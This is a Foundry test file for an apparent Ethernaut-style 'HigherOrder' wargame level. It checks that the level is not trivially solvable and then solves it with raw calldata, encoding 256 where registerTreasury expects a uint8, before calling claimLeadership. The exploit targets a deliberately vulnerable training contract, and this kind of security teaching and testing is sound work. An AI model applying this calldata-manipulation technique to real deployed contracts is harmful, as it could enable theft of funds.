pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/base/ILevel.sol";
import "./utils/Utils.sol";

import {console} from "forge-std/console.sol";

interface IHigherOrder {
    function commander() external returns (address);
    function treasury() external returns (uint256);
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}

contract HigherOrderAttackTest is Test, Utils {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    ILevel public factory;
    IHigherOrder public instance;

    function setUp() public {
        factory = ILevel(Utils.oldCompilerFactory("HigherOrderFactory"));
        instance = IHigherOrder(factory.createInstance(dummyPlayerAddress));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        (bool result, bytes memory _data) = address(instance).call(abi.encodeWithSignature("claimLeadership()"));
        assertEq(factory.validateInstance((payable(address(instance))), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress);
        bytes memory data = abi.encodePacked(uint256(256));
        (bool result, bytes memory _data) =
            address(instance).call(abi.encodePacked(IHigherOrder.registerTreasury.selector, data));
        instance.claimLeadership();

        assertEq(factory.validateInstance((payable(address(instance))), dummyPlayerAddress), true);
    }
}
